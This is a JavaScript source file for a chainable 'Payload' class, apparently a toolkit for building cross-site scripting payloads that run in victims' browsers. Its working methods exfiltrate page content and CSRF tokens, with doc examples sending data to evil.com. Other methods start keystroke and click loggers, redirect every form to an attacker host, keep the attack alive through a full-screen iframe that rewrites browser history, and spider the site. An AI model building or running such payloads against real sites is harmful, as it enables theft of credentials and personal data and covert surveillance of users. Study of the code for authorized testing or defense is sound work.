import { repr, escapeRegExp, isCallable } from "./utils.js"



/**
 * A payload object
 * @param {Payload} [parent=null] Parent payload
 * @param {function} [render=null] Render function for the payload
 * @class
 */
class Payload {
    /**
     *
     * Used internally<br>
     * Use [Payload.new()]{@link Payload.new} instead.
     *
     * @param {Payload} parent The parent wrapper
     * @param {function} render The actual render function
     */
    constructor(parent = null, render = null) {
        this.parent = parent
        this.render = render ? render : x => x
    }

    /**
     * Return a new [Payload]{@link Payload} object.
     * @graph ($current) {} -> $Payload
     * @returns {Payload}
     */
    static new() {
        return new Payload()
    }


    _bind(f, args) {
        const func = typeof f === "string" ? Function(f) : f
        const funcStr = func.toString()
        const params = args.length ? args.map(a => repr(a)).join(",") + `,_` : "_"
        return `(await(${funcStr})(${params}))`
    }
    _asyncBind(f, args) {
        const func = typeof f === "string" ? Function(f) : f
        const funcStr = func.toString()
        const params = args.length ? args.map(a => repr(a)).join(",") + `,_` : "_"
        return `((${funcStr})(${params}))`
    }
    /**
     * This add a function to eval to the payload,
     * the function take the value in the pipe as an argument named _
     * the value returned by the function is then passed in the pipe
     * @param {string|function|Payload} code_or_func  to eval on the target,
     * if code_or_func is a function, then is converted to string.
     * @param {...any} args arguments to bind to the function
     * @graph $Payload -> {Any} ($current) {Any} -> $Payload
     * @example
     * const p = Payload.new()
     *               .eval(()=>42)      # pipe value set to 42
     *               .eval(x=>alert(x))  # alert 42
     *
     * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    eval(code_or_func, ...args) {
        const funcCode = this._bind(code_or_func, args)
        return new Payload(this, code => {
            if (code) {
                return `async(_)=>(${code})${funcCode}`
            }

            return `async(_)=>${funcCode}`
        })
    }

    /**
     * This add a function to eval to the payload,
     * the function take the value in the pipe as an argument named _
     * the value return by the function is ignored, the previous value on pipe
     * is keeped.
     * @public
     * @param {string|function|Payload} code_or_func to eval on the target,
     * if code_or_func is a function, then is converted to string.
     * @param {...any} args arguments to bind to the function
     * @graph $Payload -> {Any} ($current) -> $Payload
     * @example
     * const p = Payload.new()
     *               .eval(()=>42)                 # pipe value set to 42
     *               .passthru(v=>console.log(v))  # log the value of the pipe
     *               .exfiltrate()                 # 42
     *
     * eval(p.run())
     * @graphStep skip
     * @returns {Payload} The new payload object in the chain.
     */
    passthru(code_or_func, ...args) {
        const funcCode = this._bind(code_or_func, args)

        return new Payload(this, code => {
            if (code) {
                return `async(_)=>(${code})([${funcCode},_][1])`
            }

            return `async(_)=>[${funcCode},_][1]`
        })
    }


    asyncEval(code_or_func, ...args) {
        const funcCode = this._asyncBind(code_or_func, args)

        return new Payload(this, code => {
            if (code) {
                return `async(_)=>(${code})([${funcCode},_][1])`
            }

            return `async(_)=>[${funcCode},_][1]`
        })
    }
    /**
     * This add multiple payload to eval simultaneously with the current pipe value.
     * @param {...(Payload|Function)} payloads Payloads to run simultaneously,
     * @graph $Payload -> {Any} ($current)[payload-1,payload-2,payload-3]* {[Any]} -> $Payload
     * @example
     * const p = Payload.new()
     *               .parallel(
     *                   Payload.new().fetchDOM("/"),
     *                   Payload.new().fetchDOM("/api")
     *               .exfiltrate()
     *
     * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    parallel(...payloads) {
        return this.eval(async (funcs, x) => {
            const results = await Promise.allSettled(funcs.map(f => f(x)))
            return results.map(p => (p.status == 'fulfilled' ? p.value : p.reason))
        }, payloads)
    }


    /**
     * Take an array from the pipe an call the payload for each element, all calls are made simultaneously.<br>
     * <br>
     * Each payload take an element from the array as an argument
     * @graph $Payload -> {[Any]} ($current)[payload,payload,payload]* {[Any]} -> $Payload
     * @param {Payload|Function} payload to run for each elements of the pipe value,
     * @example
     * const p = Payload.new()
     *               .fetchDOM("/")
     *               .querySelectorAll("a", "href")
     *               .map(
     *                   Payload.new().fetchText()
     *                 )
     *               .exfiltrate()
     *
     * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    map(payload) {
        return this.eval(async (f, x) => {
            const results = await Promise.allSettled(x.map(x => f(x)))
            return results.map(p => (p.status == 'fulfilled' ? p.value : p.reason))
        }, payload)
    }
    /**
     * Take an array from the pipe an call the payload for each element, all calls are made simultaneously.<br>
     * <br>
     * Each payload take an element from the array as an argument<br> 
     * 
     * @graph $Payload -> {[Any]} ($current)[payload,payload,payload]*  -> $Payload
     * @param {Payload|Function} payload to run for each elements of the pipe value,
     * @example
     * const p = Payload.new()
     *               .fetchDOM("/")
     *               .querySelectorAll("a", "href")
     *               .forEach(
     *                    Payload.new().fetchText()
     *                 )
     *               .exfiltrate()
     *
     * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    forEach(payload) {
        return this.passthru(async (f, x) => {
            const results = await Promise.allSettled(x.map(x => f(x)))
            results.map(p => (p.status == 'fulfilled' ? p.value : p.reason))
            return results.map(p => (p.status == 'fulfilled' ? p.value : p.reason))
        }, payload)
    }

    /**
     * Ensure that the payload will only be run once, usefull when the vulnerable parameter is reflected multiple time.
     *
     * @graph $Payload -> ($current) -> $Payload 
     * @example
     * const p = Payload.new()
     *               .guard()
     *               .eval(x => alert(x))
     *
     * eval(p.run()) # call alert()
     * eval(p.run()) # raise Guard error
     *
     * @returns {Payload} The new payload object in the chain.
     */
    guard() {
        const guard = Math.floor(Math.random() * 1000000).toString(16)
        return this.passthru((guard) => {
            if (window.__guard == guard) {
                throw Error("Guard")
            }
            window.__guard = guard
        }, guard)
    }

    /**
    * Set the exfiltrator to use when {@link exfiltrate} is called.
    * @graph $Payload -> ($current) -> $Payload
    * @param {Payload|function} exfiltrator exfiltrator to use.
    * exfiltrator is a function that take the data to exfiltrate and do something with it.
    * @example
    * const p new Payload()
    *             .setExfiltrator(x => fetch('https://evil.com/?' + x))
    *             .eval(x=>42)
    *             .exfiltrate()
    *
    * eval(p.run())
    * @example
    * const p new Payload()
    *             .setExfiltrator(exfiltrators.message())
    *             .eval(x=>42)
    *             .exfiltrate()
    *
    * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    setExfiltrator(exfiltrator) {
        return this.passthru(f => (this.__exfiltrator = [f]), exfiltrator)
    }
    /**
    * Add an exfiltrator to use when {@link exfiltrate} is called.
    * @graph $Payload -> ($current) -> $Payload
    * @param {function|Payload} exfiltrator exfiltrator to use.
    * exfiltrator is a function that take the data to exfiltrate and do something with it.
    * @example
    * const p new Payload()
    *             .addExfiltrator(x => fetch('https://evil.com/?' + x))
    *             .addExfiltrator(exfiltrators.message())
    *             .eval(x=>42)
    *             .exfiltrate()
    *
    * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    addExfiltrator(exfiltrator) {
        return this.passthru(f => (this.__exfiltrator = this.__exfiltrator ? this.__exfiltrator.concat(f) : [f]), exfiltrator)
    }

    /**
    * Exfiltrate the current pipe value.
    * @graph $Payload -> {Any} ($current) -> $Payload
    * @example
    * const p new Payload()
    *             .addExfiltrator(exfiltrators.message())
    *             .eval(x=>42)
    *             .exfiltrate()
    *
    * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    exfiltrate(s = null) {
        if (s != null) {
            return this.passthru(data => (this.__exfiltrator || []).forEach(e => e(data)), s)
        }
        return this.passthru(data => (this.__exfiltrator || []).forEach(e => e(data)))
    }


    /**
    * Wait before contiuing the execution.
    * @graph $Payload -> {int} ($current) -> $Payload
    * @param {number|Payload|function} ms Time to wait in ms.
    * @example
    * const p new Payload()
    *             .fetch("/sendMail")      # Long operation that continue after the response
    *             .wait(4000)              # wait for 4s
    *             .fetchText("/readMail")
    *             .exfiltrate()
    *
    * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    wait(ms = null) {
        if (isCallable(ms)) {
            return this.passthru(async (f, x) => {
                const ms = await f(x)
                return new Promise(r => window.setTimeout(r, ms))
            }, ms)
        }
        if (ms === null) {
            this.passthru(ms => new Promise(r => window.setTimeout(r, ms)))
        }
        return this.passthru(ms => new Promise(r => window.setTimeout(r, ms)), ms)
    }

    /**
    * Fetch the supplied url, the response is then passed in the pipe. <br>
    * <br>
    * Most of the time [fetchText]{@link Payload#fetchText}, [fetchDOM]{@link Payload#fetchDOM}, [fetchJSON]{@link Payload#fetchJSON} are what yout need
    * @param {string|function|Payload} url_or_func URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .
    * @param {object} [options={}] Options passed to fetch (ignored if url_or_func is a function).
    * @graph $Payload -> {String | [String, Object]} ($current) {Response} -> $Payload
    * @example
    * const p new Payload()
    *             .fetch("/")
    *             .eval(r=>r.status)
    *             .exfiltrate()
    *
    * eval(p.run())
    * @example
    * const p new Payload()
    *               eval(()=> {
    *                 return [window.API_URL, {headers: {"X-CSRF-TOKEN": window.TOKEN}}]
    *               })
    *             .fetch()
    *             .eval(r=>r.status)
    *             .exfiltrate()
    *
    * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    fetch(url_or_func, options = {}) {
        if (isCallable(url_or_func)) {
            return this.eval(async (f, x) => {
                const r = await f(x)
                return Array.isArray(r) ? fetch(...r) : fetch(r)
            }, url_or_func)
        } else if (url_or_func !== undefined) {
            return this.eval((url, opt) => fetch(url, opt), url_or_func, options)
        } else {
            return this.eval((url) => Array.isArray(url) ? fetch(...url) : fetch(url))
        }
    }

    /**
    * Fetch the supplied url, the response text is then passed in the pipe.
    *
    * @param {string|function|Payload} url_or_func URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .
    * @param {object} [options={}] Options passed to fetch (ignored if url_or_func is a function).
    * @graph $Payload -> {String | [String, Object]} ($current) {String} -> $Payload
    * @example
    * const p new = Payload()
    *               .fetchText("/")
    *               .exfiltrate()
    *
    * eval(p.run())
    * @example
    * const p new = Payload()
    *               .eval(()=> {
    *                   return [window.API_URL, {headers: {"X-CSRF-TOKEN": window.TOKEN}}]
    *                 })
    *               .fetchText()
    *               .exfiltrate()
    *
    * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    fetchText(url_or_func, options = {}) {
        return this.fetch(url_or_func, options).eval(r => r.text())
    }

    /**
    * Fetch the supplied url, the response text is parsed as html and passed in the pipe.
    *
    * @param {string|function|Payload} url_or_func URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .
    * @param {object} [options={}] Options passed to fetch (ignored if url_or_func is a function).
    * @graph $Payload -> {String | [String, Object]} ($current) {Document} -> $Payload
    * @example
    * const p = Payload.new()
    *               .fetchDOM("/")
    *               .querySelector("title", "innerText")
    *               .exfiltrate()
    *
    * eval(p.run())
    * @example
    * const p = Payload.new()
    *               .eval(()=> {
    *                   return [window.API_URL, {headers: {"X-CSRF-TOKEN": window.TOKEN}}]
    *                 })
    *               .fetchDOM()
    *               .querySelector("title", "innerText")
    *               .exfiltrate()
    *
    * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    fetchDOM(url_or_func, options = {}) {
        return this.fetchText(url_or_func, options).asDOM()
    }

    /**
    * Fetch the supplied url, the response text is parsed as json and passed in the pipe.
    *
    * @graph $Payload -> {String | [String, Object]} ($current) {Any} -> $Payload
    * @param {function|Payload|string} url_or_func URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .
    * @param {object} [options={}] Options passed to fetch (ignored if url_or_func is a function).
    * @example
    * const p = Payload.new()
    *               .fetchJSON("/")           # return a json object
    *               .eval(obj => obj.msg)
    *               .exfiltrate()
    *
    * eval(p.run())
    * @example
    * const p = Payload.new()
    *               .eval(()=> {
    *                   return [window.API_URL, {headers: {"X-CSRF-TOKEN": window.TOKEN}}]
    *                 })
    *               .fetchJSON()
    *               .eval(obj => obj.msg)
    *               .exfiltrate()
    *
    * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    fetchJSON(url_or_func, options = {}) {
        return this.fetch(url_or_func, options).eval(r => r.json())
    }


    /**
     * Take the pipe value, parse it as html or xml and set the result as the pipe value.
     *
     * @param {string}[lang="text/html"] Language to use for the parser,
     * @graph $Payload -> {String} ($current) {Document} -> $Payload
     * @example
     * const p = Payload.new()
     *               .fetchText("/")
     *               .asDOM()
     *               .querySelector("title", "innerText")
     *               .exfiltrate()
     *
     * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    asDOM(lang = "text/html") {
        return this.eval((lang, s) => new DOMParser().parseFromString(s, lang), lang)
    }

    /**
     * Take the pipe value and search for the first element matching the selector, the element is then set as the pipe value.
     * If attr is passed to the function, only the corresponding attribute is passed in the pipe
     *
     * @param {string} selector_or_func CSS selector,
     * @param {string} [attr=null] Attribute
     * @graph $Payload -> {Document} ($current) {HTMLElement | Any} -> $Payload
     * @example
     * const p = Payload.new()                                       # by default the pipe value is set to window.document
     *               .querySelector('title')                       # get the title element
     *               .passthru(el => el.innerText = 'New title')   # change the title
     *
     * eval(p.run())
     * @example
     * const p = Payload.new()
     *               .fetchDOM("/user/me")
     *               .querySelector('input[name=email]', 'value')
     *               .exfiltrate()
     *
     * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    querySelector(selector_or_func, attr = null) {
        if (isCallable(selector_or_func)) {
            return this.eval(async (f, x) => {
                const r = await f(x)
                if (Array.isArray(r)) {
                    const el = x.querySelector(r[0])
                    return r.length > 1 ? el[r[1]] : el
                } else {
                    return x.querySelector(r)
                }
            }, selector_or_func)
        }

        const p = this.eval((selector, html) => html.querySelector(selector), selector_or_func)
        if (attr === null) {
            return p
        }
        return p.eval((attr, x) => x[attr], attr)
    }

    /**
     * Take the pipe value and search for all elements matching the selector, an array of elements is then set as the pipe value.
     * If attr is passed to the function, only the corresponding attribute is passed in the pipe
     *
     * @param {string} selector_or_func CSS selector,
     * @param {string} [attr=null] Attribute
     * @graph $Payload -> {Document} ($current) {[HTMLElement] | [Any]} -> $Payload
     * @example
     * const p = Payload.new()                                       # by default the pipe value is set to window.document
     *               .querySelectorAll('form')                     # get all the forms
     *               .passthru(els => {
     *                   els.forEach(el => el.action = '//evil.com') # change the form destination
     *                 })
     *
     * eval(p.run())
     * @example
     * const p = Payload.new()
     *               .fetchDOM("/")
     *               .querySelectorAll('a', 'href')     # Get all the link present on the page
     *               .exfiltrate()
     *
     * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    querySelectorAll(selector_or_func, attr = null) {
        if (isCallable(selector_or_func)) {
            return this.eval(async (f, x) => {
                const r = await f(x)
                if (Array.isArray(r)) {
                    const els = Array.from(x.querySelectorAll(r[0]))
                    return r.length > 1 ? els.map(e => e[r[1]]) : els
                } else {
                    return Array.from(x.querySelectorAll(r))
                }
            }, selector_or_func)
        }

        const p = this.eval((selector, html) => Array.from(html.querySelectorAll(selector)), selector_or_func)
        if (attr === null) {
            return p
        }
        return p.eval((attr, x) => x.map(el => el[attr]), attr)
    }

    /**
     * Take the pipe value as a string an perform a regex search on it, the first matched group is return in the pipe
     *
     * @param {string} reg_or_func Regex
     * @param {string} [flags=""] Flags for the regex [gimsuy]
     
     * @graph $Payload -> {String} ($current) {String | null} -> $Payload
     * @example
     * const p = Payload.new()
     *               .fetchText("/")
     *               .regExtract('token=([a-f0-9]+)')
     *               .exfiltrate()
     *
     * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    regExtract(reg_or_func, flags = "") {
        if (isCallable(reg_or_func)) {
            return this.eval(async (f, s) => {
                const r = await f(s)
                const [reg, flags] = Array.isArray(r) ? r : [r, ""]
                const match = new RegExp(reg, flags).exec(s)
                return match ? match[1] : null
            }, reg_or_func)
        }

        return this.eval((reg, flags, s) => {
            const match = new RegExp(reg, flags).exec(s)
            return match ? match[1] : null
        }, reg_or_func, flags)
    }

    /**
     * Take the pipe value as a string an search for a string present between to needle, the match is return in the pipe
     *
     * @param {string} before String present before the targeted text
     * @param {string} after String present after the targeted text
     * @graph $Payload -> {String} ($current) {String | null} -> $Payload
     * @example
     * const p = Payload.new()
     *               .fetchText("/")
     *               .findBetween('<title>', '</title>')
     *               .exfiltrate()
     *
     * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    findBetween(before, after) {
        if (isCallable(before)) {
            return this.eval(async (e, f, s) => {
                const [b, a] = await f(s)
                const match = new RegExp(`${e(b)}(.*?)${e(a)}`, "ms").exec(s)
                return match ? match[1] : null

            }, escapeRegExp, before)
        }
        return this.regExtract(`${escapeRegExp(before)}(.*?)${escapeRegExp(after)}`, "ms")
    }

    /**
     * Start a key logger, each keystroke will be exfiltrated via the exfiltrators.<br>
     * <br>
     * The pipe value is not modified.
     * @param {function} [f=null] User defined function to call instead of exfiltrating
     * @graph $Payload ->  ($current)  -> $Payload
     * @example
     * const p = Payload.new()
     *               .setExfiltrator(exfiltrator.get('//evil.com'))
     *               .startKeyLogger()
     *
     * eval(p.run())
     * @example
     * const p = Payload.new()
     *               .setExfiltrator(ev => console.log(ev.target))
     *               .startKeyLogger()
     *
     * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    startKeyLogger(f = null) {
        const keyLogger = ({ key }) => {
            this.__exfiltrator.forEach(e => e({ key }))
        }

        return this.passthru((f) => window.addEventListener("keydown", this.__keyLogger = f), f || keyLogger)
    }

    /**
     * Start a click logger, each click position and targeted element will be exfiltrated via the exfiltrators.<br>
     * <br>
     * The pipe value is not modified.
     * @param {function} [f=null] User defined function to call instead of exfiltrating
     * @graph $Payload ->  ($current)  -> $Payload
     * @example
     * const p = Payload.new()
     *               .setExfiltrator(exfiltrator.get('//evil.com'))
     *               .startClickLogger()
     *
     * eval(p.run())
     * @example
     * const p = Payload.new()
     *               .setExfiltrator(ev => console.log(ev.target))
     *               .startClickLogger()
     *
     * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    startClickLogger(f = null) {
        const clickLogger = ({ buttons, clientX: x, clientY: y, target: { outerHTML: target } }) => {
            this.__exfiltrator.forEach(e => e({ buttons, x, y, target }))
        }

        return this.passthru((f) => {
            window.addEventListener("click", this.__clickLogger = f)
        }, f || clickLogger)
    }

    /**
     * Read the pipe value as css and inject a style element on the page.<br>
     * <br>
     * The pipe value is not modified.
     * @param {string|function|Payload} [style_or_func=null]
     * If style_or_func is a string, then value will be used instead of the pipe value.<br>
     * If style_or_func is a function, then return value will be used instead of the pipe value.<br>
     * @graph $Payload ->  ($current)  -> $Payload
     * @example
     * const p = Payload.new()
     *               .eval(() => 'body{background:red}')
     *               .injectStyle()
     *
     * return eval(p.run())
     * @example
     * const p = Payload.new()
     *               .injectStyle('body{background:red}')
     *
     * return eval(p.run())
     * @example
     * const p = Payload.new()
     *               .eval(() => 'red')
     *               .injectStyle(color => `body{background:${color}}`)
     *
     * return eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    injectStyle(style_or_func = null) {
        if (isCallable(style_or_func)) {
            return this.passthru(async (f, x) => {
                const el = document.createElement("style")
                el.innerText = await f(x)
                document.body.appendChild(el)
            }, style_or_func)
        } else if (style_or_func !== null) {
            return this.passthru(s => {
                const el = document.createElement("style")
                el.innerText = s
                document.body.appendChild(el)
            }, style_or_func)
        } else {
            return this.passthru(s => {
                const el = document.createElement("style")
                el.innerText = s
                document.body.appendChild(el)
            })
        }
    }


    /**
     * 
     * @param {*} callback 
     */

    postMultipart(url, data, opt = {}) {
        if (isCallable(url)) {
            return this.eval((f, x) => {
                const [url, data, opt] = f(x)
                const fd = new FormData();
                for (const [key, value] of Object.entries(data)) {
                    fd.append(key, value)
                }
                return fetch(url, { ...opt, ...{ method: "POST", body: fd } })
            }, url)
        } else {
            return this.eval((url, opt, data) => {
                const fd = new FormData();
                for (const [key, value] of Object.entries(data)) {
                    fd.append(key, value)
                }
                return fetch(url, { ...opt, ...{ method: "POST", body: fd } })
            }, url, data, opt)

        }
    }

    postUrlEncoded(url, data, opt = {}) {
        if (isCallable(url)) {
            return this.eval((f, x) => {
                const [url, data, opt] = f(x)
                const fd = new URLSearchParams();
                for (const [key, value] of Object.entries(data)) {
                    fd.append(key, value)
                }
                return fetch(url, { ...opt, method: "POST", body: fd })
            }, url)
        } else {
            return this.eval((url, data, opt) => {
                const fd = new URLSearchParams();
                for (const [key, value] of Object.entries(data)) {
                    fd.append(key, value)
                }
                return fetch(url, { ...opt, method: "POST", body: fd })
            }, url, data, opt)

        }
    }
    /**
     * Try to make the payload persistant by wrapping the content in a frame.<br>
     * @graph $Payload ->  ($current)  -> $Payload
     * @param {Function|Payload} [callback=null] called each time the frame load, with the current document
     * @example
     * const p = Payload.new()
     *               .persist(
     *                 Payload.new().eval(d=>d.location).exfiltrate()
     *               )
     *
     * return eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     *
     */
    persist(callback = null) {
        return this.passthru((callback) => {
            const f = document.createElement("iframe")
            Object.assign(f.style, {
                display: "block",
                position: "absolute",
                top: "0px",
                let: "0px",
                width: "100vw",
                height: "100vh",
                border: "none",
            })
            f.addEventListener("load", ev => {
                window.history.replaceState({}, '', f.contentWindow.location.href);
                f.contentWindow.addEventListener("click", this.__clickLogger)
                f.contentWindow.addEventListener("keydown", this.__keyLogger)
                f.contentWindow.addEventListener("unload", () => {
                    let target = f.contentDocument.activeElement
                    setTimeout(() => {
                        try {
                            "" + f.contentWindow.location.href;
                        } catch {
                            location.href = target.href
                        }
                    }, 0);
                })
                callback(f.contentWindow.document)
            })
            f.src = "/"
            document.documentElement.innerHTML = ""
            document.documentElement.appendChild(f)
        }, callback || (x => x))
    }

    spider(path, depth = 1, callback = null) {
        return this.eval(async (href, depth, callback) => {
            const visited = new Map()

            const getLinks = (html => {
                const d = new DOMParser().parseFromString(html, "text/html")
                const links = Array.from(d.querySelectorAll("a")).map(a => a.href)
                return links.filter(a => !visited.has(a))
            })

            const spider = async (path, depth) => {
                const html = await fetch(path, { mode: "same-origin", cache: "only-if-cached" }).then(r => r.text()).catch(() => null)
                visited.set(path, html)
                callback(path, html)
                if (html === null) return
                const links = getLinks(html)
                if (depth == 0) return
                return await Promise.all(links.map(l => spider(l, depth - 1)))
            }

            await spider(Object.assign(document.createElement("a"), { href }).href, depth)
            return Array.from(visited.entries())
        }, path, depth, callback || (_ => _))
    }

    /**
     * Read the pipe value and send it to a frame using postMessage<br>
     * <br>
     * The pipe value is not modified.
     * @param {string} [name="top"] Name of the targeted frame
     * @param {string} [target="*"] Target for the message
     * @graph $Payload -> {Any} ($current)  -> $Payload
     * @returns {Payload} The new payload object in the chain.
     */
    postMessage(name = "top", target = "*") {
        return this.passthru((name, target, msg) => window.frames[name].postMessage(msg, target), name, target)
    }

    /**
     * Log the pipe value in the console, used for debugging purpose <br>
     * <br>
     * The pipe value is not modified.
     * @graph $Payload -> {Any} ($current)  -> $Payload
     * @example
     * const p = Payload.new()
     *               .fetchDOM("/")
     *               .log()
     *               .querySelector("title", "innerText")
     *               .log()
     *               .exfiltrate()
     *
     * eval(p.run())
     * @returns {Payload} The new payload object in the chain.
     */
    log() {
        return this.passthru(x => console.log(x))
    }

    /**
     * Redirect the user to a new url
     * @param {*} url
     * @returns {Payload} The new payload object in the chain.
     */
    redirect(url) {
        return this.passthru((url) => window.location = url, url)
    }


    compile(code = null) {
        if (this.parent) {
            return this.parent.compile(this.render(code))
        }
        return this.render(code || "_=>_")
    }

    toString() {
        return this.compile() || ""
    }

    bindRun(bind = null, ...args) {
        return `(function(){return (${this.compile()})(${args.join(",")})}).bind(${bind})()`
    }
    run() {
        return this.bindRun("{}", "window.document")

    }
}


export default Payload;